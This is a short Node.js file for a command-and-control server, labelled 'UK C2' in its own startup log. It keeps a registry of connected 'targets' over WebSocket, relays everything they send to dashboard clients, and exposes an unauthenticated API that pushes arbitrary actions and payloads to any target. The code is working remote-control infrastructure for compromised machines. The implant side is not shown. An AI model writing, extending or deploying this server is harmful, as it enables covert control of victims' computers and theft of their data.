const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '100mb' }));

const targets = new Map(); // id -> ws
const dashboards = new Set();

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const id = url.searchParams.get('id');
  const role = url.searchParams.get('role');

  if (role === 'dashboard') {
    dashboards.add(ws);
    ws.on('close', () => dashboards.delete(ws));
  } else if (id) {
    targets.set(id, ws);
    console.log(`[+] Target connected: ${id}`);
    broadcastDashboard({ type: 'status', id, status: 'online' });

    ws.on('message', (msg) => {
      try {
        const data = JSON.parse(msg);
        broadcastDashboard({ from: id, ...data });
      } catch (e) {}
    });

    ws.on('close', () => {
      targets.delete(id);
      console.log(`[-] Target disconnected: ${id}`);
      broadcastDashboard({ type: 'status', id, status: 'offline' });
    });
  }
});

function broadcastDashboard(data) {
  const str = JSON.stringify(data);
  dashboards.forEach(d => { if (d.readyState === WebSocket.OPEN) d.send(str); });
}

app.post('/api/command', (req, res) => {
  const { id, action, payload } = req.body;
  const target = targets.get(id);
  if (!target || target.readyState !== WebSocket.OPEN) {
    return res.status(404).json({ error: 'Target offline' });
  }
  target.send(JSON.stringify({ action, payload }));
  res.json({ success: true });
});

app.get('/api/targets', (req, res) => {
  res.json({ targets: Array.from(targets.keys()) });
});

server.listen(process.env.PORT || 3000, () => {
  console.log('UK C2 running on port', process.env.PORT || 3000);
});